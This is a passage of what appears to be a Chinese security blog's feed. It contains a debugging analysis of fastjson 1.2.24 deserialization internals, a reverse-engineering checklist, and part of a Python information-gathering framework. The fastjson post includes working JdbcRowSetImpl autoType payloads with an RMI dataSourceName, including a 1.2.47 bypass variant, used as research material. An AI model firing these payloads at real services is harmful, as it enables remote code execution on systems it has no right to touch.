parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
deserialze:105, StringCodec (com.alibaba.fastjson.serializer)
deserialze:87, StringCodec (com.alibaba.fastjson.serializer)
parseField:71, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)
parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser)
parseObject:339, JSON (com.alibaba.fastjson)
parseObject:243, JSON (com.alibaba.fastjson)
parseObject:456, JSON (com.alibaba.fastjson)
main:41, test (test)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;所以猜测在第一种payload调用deserializer.deserialze(this, clazz, fieldName);时本来应该有一次setContext，但是他没有，所以报错&lt;/p&gt;

&lt;p&gt;感觉像是代码的bug&lt;/p&gt;

&lt;p&gt;验证：&lt;/p&gt;

&lt;p&gt;通过找资料发现第一种payload实际上是1.2.47的一个绕过，于是下载了1.2.47的源码进行调试，发现1.2.47在parseObject函数中调用popContext的地方加了更多的判断使反序列化java.lang.Class类时不执行popContext，因此1.2.24实际上是多了一次popContext导致的失败&lt;/p&gt;

&lt;p&gt;1.2.47：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801233523275.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;1.2.24：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801233548941.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><category term="java" /><summary type="html">本想系统的学学javaweb，但是一实习空闲时间就变得很少，所以还是先捡重要的看吧 分析组件的过程跟逆向过程挺像，不过好的地方是有源码作为参考，所以过程也更加轻松 调试用的代码 String jsonString = &quot;{\&quot;name\&quot;:{\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;},\&quot;f\&quot;:{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/adas\&quot;,\&quot;autoCommit\&quot;:true}}&quot;; Group group = JSON.parseObject(jsonString, Group.class); 从com.alibaba.fastjson.JSON#parseObject看起，首先实例化了一个DefaultJSONParser，而在实例化DefaultJSONParser的过程中又先实例化了一个JSONScanner，所以先看JSONScanner JSONScanner JSONScanner继承抽象类JSONLexerBase，作为lexer放在DefaultJSONParser内部 JSONLexerBase有几个成员变量 protected int token; protected int pos; protected int features; protected char ch; protected int bp;//当前指向的位置 protected int eofPos; /** * A character buffer for literals. */ protected char[] sbuf; protected int sp; /** * number start position */ protected int np; 同时JSONScanner也新定义了两个 private final String text; //反序列化的字符串 private final int len;//字符串长度 //将bp指针指向下一个字符，如果到末尾则返回eoi，否则返回当前指向的字符 public final char next() { int index = ++bp; return ch = (index &amp;gt;= this.len ? // EOI // : text.charAt(index)); } JSONScanner的初始化 public JSONScanner(String input, int features){ super(features); text = input; len = text.length(); bp = -1; next(); if (ch == 65279) { // utf-8 bom next(); } } DefaultJSONParser 不太好总结是干什么的，JSON的解析都在这个类中进行，在DefaultJSONParser初始化后fastjson调用其parseObject方法进行反序列化 在com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.lang.reflect.Type, java.lang.Object)中会获取要反序列化的类所对应的deserializer，如果没有则进行创建 进入这个函数 public ObjectDeserializer getDeserializer(Type type) { //首先会在已有的deserializer中找，this.derializers是一个hashmap ObjectDeserializer derializer = this.derializers.get(type); if (derializer != null) { return derializer; } //没有找着就接着找 if (type instanceof Class&amp;lt;?&amp;gt;) { return getDeserializer((Class&amp;lt;?&amp;gt;) type, type); } ………………省略…………………… } 进入getDeserializer的另一个重载，这个函数首先会匹配type的类型，否则会检查是否是泛型相关接口。然后检查反序列化的目标类是否在denyList中 public ObjectDeserializer getDeserializer(Class&amp;lt;?&amp;gt; clazz, Type type) { //继续匹配 ObjectDeserializer derializer = derializers.get(type); if (derializer != null) { return derializer; } if (type == null) { type = clazz; } //继续匹配 derializer = derializers.get(type); if (derializer != null) { return derializer; } { JSONType annotation = clazz.getAnnotation(JSONType.class); if (annotation != null) { Class&amp;lt;?&amp;gt; mappingTo = annotation.mappingTo(); if (mappingTo != Void.class) { return getDeserializer(mappingTo, mappingTo); } } } //判断是否是泛型相关的接口的实例，至于什么是泛型接口的实例，咱也不知道 if (type instanceof WildcardType || type instanceof TypeVariable || type instanceof ParameterizedType) { derializer = derializers.get(clazz); } if (derializer != null) { return derializer; } //反序列化的类是否在denyList中 String className = clazz.getName(); className = className.replace('$', '.'); for (int i = 0; i &amp;lt; denyList.length; ++i) { String deny = denyList[i]; if (className.startsWith(deny)) { throw new JSONException(&quot;parser deny : &quot; + className); } } 之后还会根据一些情况进行匹配，在所有匹配均不成功后，就会创建一个新的deserializer createJavaBeanDeserializer里，会根据asmEnable分两种情况去创建并返回一个JavaBeanDeserializer 如果目标class的父类中有非public的成员变量，则asmEnable为false，除此之外还有许多条件，如果不成立则asmEnable都为false 先跟进asm为false的情况，直接new一个JavaBeanDeserializer JavaBeanDeserializer //其中定义的一些成员变量 private final FieldDeserializer[] fieldDeserializers; protected final FieldDeserializer[] sortedFieldDeserializers; protected final Class&amp;lt;?&amp;gt; clazz; public final JavaBeanInfo beanInfo; private ConcurrentMap&amp;lt;String, Object&amp;gt; extraFieldDeserializers; com.alibaba.fastjson.util.JavaBeanInfo#build 获取了目标类所生命的成员变量，方法，构造方法 最后返回一个JavaBeanInfo类 在JavaBeanInfo的构造方法中，除了一些基本的初始化，还会讲成员变量进行排序，生成一个sortedFields数组，不知道为什么要另外弄一个sortedFields public JavaBeanInfo(Class&amp;lt;?&amp;gt; clazz, // Class&amp;lt;?&amp;gt; builderClass, // Constructor&amp;lt;?&amp;gt; defaultConstructor, // Constructor&amp;lt;?&amp;gt; creatorConstructor, // Method factoryMethod, // Method buildMethod, // JSONType jsonType, // List&amp;lt;FieldInfo&amp;gt; fieldList){ this.clazz = clazz; this.builderClass = builderClass; this.defaultConstructor = defaultConstructor; this.creatorConstructor = creatorConstructor; this.factoryMethod = factoryMethod; this.parserFeatures = TypeUtils.getParserFeatures(clazz); this.buildMethod = buildMethod; ....省略..... fields = new FieldInfo[fieldList.size()]; fieldList.toArray(fields); FieldInfo[] sortedFields = new FieldInfo[fields.length]; System.arraycopy(fields, 0, sortedFields, 0, fields.length); Arrays.sort(sortedFields); ....省略..... } 在JavaBeanDeserializer的构造函数中把刚刚返回的javaBeanInfo中的sortedFields和fields放到sortedFieldDeserializers和fieldDeserializers中 至此deserializer创建完成，在创建好deserializer后讲其放入自己的deserializers表中，然后开始进行反序列化 fastjson-1.2.24-sources.jar!/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java:349 从这里开始按照上文提到的sortedFieldDeserializers的顺序进行扫描，并解析对应字段中的值 当找到对于字段相同，内容类型不同的，进一步进行解析，这里可以看到fastjson会对key值做判断，如果key值等于$ref或@type则会有特殊的处理 之后继续跟进会来到这里com.alibaba.fastjson.parser.DefaultJSONParser#parse(java.lang.Object) 判断当前指向的符号，如果是”{“则创建一个JSONObject继续解析 当作为JSONObject继续解析时，同样会对key做判断，如果是@type则会获取类名并加载 com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader) 之后会根据clazz获取deserializer进行反序列化 用asm来生成处理类的情况： 也就是当asmEnable为true的情况 截一个代码随便看看，如果想看到摄功能成的处理类得抓出字节码然后反编译，感觉有点麻烦，所以就不弄了 为什么要有autoType功能 在分析组件的时候就在想如果没有autotype好像也没什么所谓，于是也搜了下我的疑问 https://github.com/alibaba/fastjson/issues/3218 当反序列化一个类包含了一个接口或者抽象类的时候，使用fastjson进行序列化的时候会将原来的类型抹去，只保留接口，使反序列化之后无法拿到原来的类型信息，加入autotype则可以指定类型，保留类型信息 遇到的问题 测试的时候找了两个payload，大体都一样，只不过第一个payload比第二个多了反序列化java.lang.Class类的部分，导致第一个payload打不成功 使用payload1 String jsonString = &quot;{\&quot;name\&quot;:{\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;},\&quot;f\&quot;:{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/adas\&quot;,\&quot;autoCommit\&quot;:true}}&quot;; 会报Caused by: java.lang.ArrayIndexOutOfBoundsException: -1 调用栈 popContext:1256, DefaultJSONParser (com.alibaba.fastjson.parser) parseObject:358, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser) parseExtra:1490, DefaultJSONParser (com.alibaba.fastjson.parser) parseField:766, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser) parseObject:339, JSON (com.alibaba.fastjson) parseObject:243, JSON (com.alibaba.fastjson) parseObject:456, JSON (com.alibaba.fastjson) main:41, test (test) 看了一下，是因为执行这条语句是contextArrayIndex为0导致的 经过调试发现在最开始创建对象的时候会调用一次addContext，每次调用com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)会做一次popContext的操作，也就是每次解析JSONObject时都会调用一下，payload中有两个JSONObject，分别是 {&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;} {&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/adas&quot;,&quot;autoCommit&quot;:true} 所以导致数组越界 再调试另一种payload String jsonString = &quot;{\&quot;name\&quot;:{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/adas\&quot;,\&quot;autoCommit\&quot;:true}}&quot;; 少了一个JSONObject，所以popContext没有问题，同时又发现asm生成的类中有调用addContext的操作具体在 deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer) 下面是调用堆栈 addContext:1280, DefaultJSONParser (com.alibaba.fastjson.parser) setContext:1274, DefaultJSONParser (com.alibaba.fastjson.parser) deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer) deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser) deserialze:105, StringCodec (com.alibaba.fastjson.serializer) deserialze:87, StringCodec (com.alibaba.fastjson.serializer) parseField:71, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser) parseObject:339, JSON (com.alibaba.fastjson) parseObject:243, JSON (com.alibaba.fastjson) parseObject:456, JSON (com.alibaba.fastjson) main:41, test (test) 所以猜测在第一种payload调用deserializer.deserialze(this, clazz, fieldName);时本来应该有一次setContext，但是他没有，所以报错 感觉像是代码的bug 验证： 通过找资料发现第一种payload实际上是1.2.47的一个绕过，于是下载了1.2.47的源码进行调试，发现1.2.47在parseObject函数中调用popContext的地方加了更多的判断使反序列化java.lang.Class类时不执行popContext，因此1.2.24实际上是多了一次popContext导致的失败 1.2.47： 1.2.24：</summary></entry><entry><title type="html">逆向的一些总结</title><link href="https://citrusice.github.io/posts/re-summarize/" rel="alternate" type="text/html" title="逆向的一些总结" /><published>2020-07-09T18:35:43+08:00</published><updated>2020-07-09T18:35:43+08:00</updated><id>https://citrusice.github.io/posts/re-summarize</id><content type="html" xml:base="https://citrusice.github.io/posts/re-summarize/">&lt;p&gt;最近做了一些windows逆向的工作，尽管大部分都是苦力活，但还是有一些收获，所以总结一下&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;观察程序行为&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;文件操作&lt;/li&gt;
      &lt;li&gt;注册表读写&lt;/li&gt;
      &lt;li&gt;dll调用&lt;/li&gt;
      &lt;li&gt;……&lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;procmon&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;定位关键代码&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;搜索字符串特征&lt;/li&gt;
      &lt;li&gt;相关windows api
        &lt;ul&gt;
          &lt;li&gt;CreateFile&lt;/li&gt;
          &lt;li&gt;ReadFile&lt;/li&gt;
          &lt;li&gt;WriteFile&lt;/li&gt;
          &lt;li&gt;……&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;内存断点&lt;/li&gt;
      &lt;li&gt;函数特征，ida signature，findcrypt&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;代码分析&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;动态分析 =&amp;gt; 分析具体行为&lt;/li&gt;
      &lt;li&gt;静态分析 =&amp;gt; 分析调用关系，程序逻辑&lt;/li&gt;
      &lt;li&gt;关注数据流向&lt;/li&gt;
      &lt;li&gt;类的识别&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;逆不动？&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;注入进程寻找解密后的数据&lt;/li&gt;
      &lt;li&gt;找到解密函数直接调用&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;未解决的问题以及可能的解决方案&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;结构体及类的逆向&lt;/p&gt;

        &lt;p&gt;下次可以尝试使用reclass&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;在发现一个已经初始化完毕的对象、结构体后，难以定位之前对其进行初始化、写入数据等操作的代码&lt;/p&gt;

        &lt;ul&gt;
          &lt;li&gt;
            &lt;p&gt;ce搜索指针链，一层一层定位初始化代码&lt;/p&gt;
          &lt;/li&gt;
          &lt;li&gt;
            &lt;p&gt;下断new，malloc、VirtualAlloc等函数，定位构造函数&lt;/p&gt;
          &lt;/li&gt;
          &lt;li&gt;
            &lt;p&gt;根据构造函数特征定位构造函数&lt;/p&gt;

            &lt;ul&gt;
              &lt;li&gt;
                &lt;p&gt;使用ecx传参（类函数特征）&lt;/p&gt;
              &lt;/li&gt;
              &lt;li&gt;
                &lt;p&gt;函数开始push ebx, esi, edi, ecx寄存器，对exc操作之后再pop ecx&lt;/p&gt;

                &lt;p&gt;&lt;a href=&quot;https://bbs.pediy.com/thread-195449.htm&quot;&gt;https://bbs.pediy.com/thread-195449.htm&lt;/a&gt;&lt;/p&gt;

                &lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/predator-wang/p/8031071.html&quot;&gt;https://www.cnblogs.com/predator-wang/p/8031071.html&lt;/a&gt;&lt;/p&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ps：&lt;/p&gt;

&lt;p&gt;web手做逆向，有点惨&lt;/p&gt;</content><author><name></name></author><category term="reverse-engineering" /><summary type="html">最近做了一些windows逆向的工作，尽管大部分都是苦力活，但还是有一些收获，所以总结一下 观察程序行为 文件操作 注册表读写 dll调用 …… procmon 定位关键代码 搜索字符串特征 相关windows api CreateFile ReadFile WriteFile …… 内存断点 函数特征，ida signature，findcrypt 代码分析 动态分析 =&amp;gt; 分析具体行为 静态分析 =&amp;gt; 分析调用关系，程序逻辑 关注数据流向 类的识别 逆不动？ 注入进程寻找解密后的数据 找到解密函数直接调用 未解决的问题以及可能的解决方案 结构体及类的逆向 下次可以尝试使用reclass 在发现一个已经初始化完毕的对象、结构体后，难以定位之前对其进行初始化、写入数据等操作的代码 ce搜索指针链，一层一层定位初始化代码 下断new，malloc、VirtualAlloc等函数，定位构造函数 根据构造函数特征定位构造函数 使用ecx传参（类函数特征） 函数开始push ebx, esi, edi, ecx寄存器，对exc操作之后再pop ecx https://bbs.pediy.com/thread-195449.htm https://www.cnblogs.com/predator-wang/p/8031071.html ps： web手做逆向，有点惨</summary></entry><entry><title type="html">自动化信息收集框架：设计框架</title><link href="https://citrusice.github.io/posts/framework-design/" rel="alternate" type="text/html" title="自动化信息收集框架：设计框架" /><published>2020-03-20T21:33:52+08:00</published><updated>2020-03-20T21:33:52+08:00</updated><id>https://citrusice.github.io/posts/framework-design</id><content type="html" xml:base="https://citrusice.github.io/posts/framework-design/">&lt;p&gt;如果想要将各个信息收集工具整合到一起，就需要为他们封装出统一的接口，我把这些具有统一接口的对象定义为Module类。Module类具有三个抽象方法需要在封装模块的时候实现：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;exec&lt;/p&gt;

    &lt;p&gt;启动模块&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;get_output&lt;/p&gt;

    &lt;p&gt;获取模块执行结果&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;update_databse&lt;/p&gt;

    &lt;p&gt;将结果输出到数据库&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;metaclass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ABCMeta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pipe_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;isinstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pipe_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;isinstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pipe_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;TypeError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Expected a List or Pipe type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;add_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;register_pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;isinstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;TypeError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Expected a Pipe&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pipe_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;send_to_pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pipe_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pipe_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
